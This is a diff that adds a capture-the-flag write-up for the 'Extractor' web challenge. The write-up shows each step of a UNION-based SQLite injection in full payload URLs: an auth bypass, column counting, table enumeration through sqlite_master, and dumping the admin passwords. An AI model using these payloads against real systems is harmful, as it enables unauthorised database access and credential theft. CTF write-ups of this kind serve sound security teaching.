@@ -164,8 +164,54 @@ shellctf{C0ooooK13_W17h_c0ooorr3c7_Parr4m37er...}
 
 ## Extractor (web)
 
-- sqlite injeciton UNION based 
+> sqlite injeciton UNION based 
 
+Syntax error :
+```
+http://52.66.29.74:8999/profile?username=admin'&pass=admin&content=1234  
+```
+get password : P4ss321 , so we have a SQLi here
+```
+http://52.66.29.74:8999/profile?username=admin'OR+1=1--&pass=admin&content=1234
+```
+get number of columns :
+
+```
+http://52.66.29.74:8999/profile?username=admin'order+by+4--+&pass=admin&content=1234
+http://52.66.29.74:8999/profile?username=admin'order+by+5--+&pass=admin&content=1234  --> error
+```
+so we have 4 columns 
+
+get columns data type : ( 2nd, 3rd , 4th are strings and printed in the page )
+
+```
+http://52.66.29.74:8999/profile?username=x'UNION+SELECT+NULL,'a','a','a'--+&pass=admin&content=1234
+```
+
+Enumerate tables :
+
+```
+http://52.66.29.74:8999/profile?username=x'UNION+SELECT+NULL,NULL,tbl_name,NULL+FROM+sqlite_master+WHERE+type='table'+and+tbl_name+NOT+like+'sqlite_%' LIMIT+0,1--+&pass=admin&content=1234```
+
+```
+```
+http://52.66.29.74:8999/profile?username=x'UNION+SELECT+NULL,NULL,tbl_name,NULL+FROM+sqlite_master+WHERE+type='table'+and+tbl_name+NOT+like+'sqlite_%' LIMIT+1,1--+&pass=admin&content=1234
+```
+![image](https://user-images.githubusercontent.com/67979878/184501361-36d1ce83-48aa-417a-b86f-28556d00f408.png)
+
+
+we got admins,users tables , we can start enumerating columns of table admins: -> guessed pass,content columns
+
+
+```
+http://20.193.247.209:8555/profile?username=x'UNION+SELECT+NULL,NULL,pass,NULL+FROM+admins--+&pass=admin&content=1234
+http://20.193.247.209:8555/profile?username=x'+UNION+SELECT+NULL,id,content,pass+FROM+admins--&pass=admin&content=a
+```
+
+![image](https://user-images.githubusercontent.com/67979878/184502784-f05cb0be-8a8f-4f7b-a41e-9fe5c6593b08.png)
+
+
+`shellctf{Sql_1Nj3c7i0n_B45iC_XD}`
 
 ## MORE ILLUSION (web)
 
